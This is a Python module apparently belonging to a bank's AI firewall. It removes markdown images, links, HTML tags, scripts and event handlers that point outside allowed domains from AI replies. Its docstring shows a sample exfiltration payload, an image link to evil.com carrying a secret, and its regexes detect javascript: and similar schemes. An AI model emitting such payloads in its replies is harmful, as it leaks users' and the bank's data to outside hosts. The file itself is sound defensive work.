"""Stops an AI reply from carrying data out of the bank when a chat UI renders it: markdown
images and links to outside domains (`![](https://evil.com/?d=<secret>)` leaks with no click),
HTML tags pointing outside, and scripts."""

from __future__ import annotations

import fnmatch
import re
from collections import Counter
from dataclasses import dataclass
from urllib.parse import urlsplit

from pydantic import BaseModel, Field

from firewall_app.controls.base import Control, control
from firewall_app.domain import Action, Check, Content, Finding, Stage, Verdict

# A URL may contain one level of balanced parentheses: [click](javascript:alert(1)).
_URL = r"((?:[^()\s>]|\([^()\s]*\))+)"
_IMAGE = re.compile(r"!\[([^\]]*)\]\(\s*<?" + _URL + r">?(?:\s+\"[^\"]*\")?\s*\)")
_LINK = re.compile(r"(?<!!)\[([^\]]*)\]\(\s*<?" + _URL + r">?(?:\s+\"[^\"]*\")?\s*\)")
_REFERENCE = re.compile(r"(?m)^[ \t]*\[([^\]]+)\]:[ \t]*(\S+)")
_HTML = re.compile(r"(?is)<(img|a|iframe)\b[^>]*?(?:src|href)\s*=\s*[\"']?([^\"'\s>]+)[^>]*>")
_SCRIPT = re.compile(r"(?is)<script\b.*?(?:</script\s*>|$)")
_HANDLER = re.compile(r"(?is)<[a-z][\w-]*\b[^>]*?\son\w+\s*=[^>]*>")
_DANGEROUS_SCHEMES = ("javascript:", "vbscript:", "data:text/html")


@dataclass(frozen=True, slots=True)
class _Hit:
    start: int
    end: int
    type: str
    detail: str  # host or kind only, never the path or query: that is where leaked data sits
    replacement: str


def _host(url: str) -> str | None:
    try:
        return urlsplit(url).hostname
    except ValueError:  # e.g. an unclosed IPv6 bracket
        return "invalid-url"


def _dangerous(url: str) -> bool:
    # Browsers ignore whitespace and control characters inside a scheme (java\tscript:).
    return re.sub(r"[\s\x00-\x1f]", "", url).lower().startswith(_DANGEROUS_SCHEMES)


@control("output_sanitizer")
class OutputSanitizer(Control):
    stages = {Stage.output}
    feature = "data_protection"
    description = (
        "Removes links, images and scripts in AI replies that could send data outside the bank."
    )

    class Params(BaseModel):
        allowed_domains: list[str] = Field(default_factory=list)  # "*.bank.internal"
        images: bool = True  # markdown images ![alt](url)
        links: bool = True  # markdown links [text](url) and reference links [x]: url
        html: bool = True  # <img>, <a>, <iframe> tags pointing outside
        scripts: bool = True  # <script>, javascript:/vbscript:/data:text/html URLs, on*= handlers

    async def evaluate(self, check: Check, params: Params) -> Verdict:
        if check.message is None:
            return Verdict()
        text = check.message.content
        hits = self._hits(text, params)
        if not hits:
            return Verdict()

        kept: list[_Hit] = []
        for hit in sorted(hits, key=lambda hit: (hit.start, hit.start - hit.end)):
            if not kept or hit.start >= kept[-1].end:
                kept.append(hit)
        for hit in reversed(kept):
            text = text[: hit.start] + hit.replacement + text[hit.end :]
        counts = Counter(hit.type for hit in kept)
        # `block` with `rewritten`: Mode redact strips, Mode block blocks the whole reply.
        return Verdict(
            action=Action.block,
            reason="unsafe output: "
            + ", ".join(f"{kind} ({count})" for kind, count in sorted(counts.items())),
            risk_score=0.9,
            findings=[
                Finding(control=self.id, type=hit.type, detail=hit.detail,
                        span=(hit.start, hit.end))
                for hit in kept
            ],
            rewritten=Content(message=check.message.model_copy(update={"content": text})),
        )

    def _hits(self, text: str, params: Params) -> list[_Hit]:
        patterns = [pattern.lower() for pattern in params.allowed_domains]

        def outside(url: str) -> str | None:
            """The host if `url` points to a domain that is not allowed, else None."""
            host = _host(url)
            if host is None or any(fnmatch.fnmatch(host.lower(), p) for p in patterns):
                return None
            return host

        def script(match: re.Match[str], what: str) -> _Hit:
            return _Hit(match.start(), match.end(), "script", what, "[script removed]")

        hits: list[_Hit] = []
        if params.scripts:
            hits += [script(m, "script tag") for m in _SCRIPT.finditer(text)]
            hits += [script(m, "event handler attribute") for m in _HANDLER.finditer(text)]

        for match in _IMAGE.finditer(text):
            url = match.group(2)
            if params.scripts and _dangerous(url):
                hits.append(script(match, "unsafe URL scheme in image"))
            elif params.images and (host := outside(url)):
                hits.append(_Hit(match.start(), match.end(), "external_image",
                                 f"image to {host}", f"[image removed: {host}]"))

        for match in _LINK.finditer(text):
            label, url = match.group(1), match.group(2)
            if params.scripts and _dangerous(url):
                hits.append(_Hit(match.start(), match.end(), "script",
                                 "unsafe URL scheme in link", f"{label} [script removed]"))
            elif params.links and (host := outside(url)):
                hits.append(_Hit(match.start(), match.end(), "external_link",
                                 f"link to {host}", f"{label} [link removed: {host}]"))

        for match in _REFERENCE.finditer(text):
            label, url = match.group(1), match.group(2)
            if params.scripts and _dangerous(url):
                hits.append(_Hit(match.start(), match.end(), "script",
                                 "unsafe URL scheme in link", f"[{label}]: [script removed]"))
            elif params.links and (host := outside(url)):
                hits.append(_Hit(match.start(), match.end(), "external_link",
                                 f"link to {host}", f"[{label}]: [link removed: {host}]"))

        for match in _HTML.finditer(text):
            tag, url = match.group(1).lower(), match.group(2)
            if params.scripts and _dangerous(url):
                hits.append(script(match, f"unsafe URL scheme in <{tag}>"))
            elif params.html and (host := outside(url)):
                hits.append(_Hit(match.start(), match.end(), "html",
                                 f"<{tag}> to {host}", "[html removed]"))
        return hits
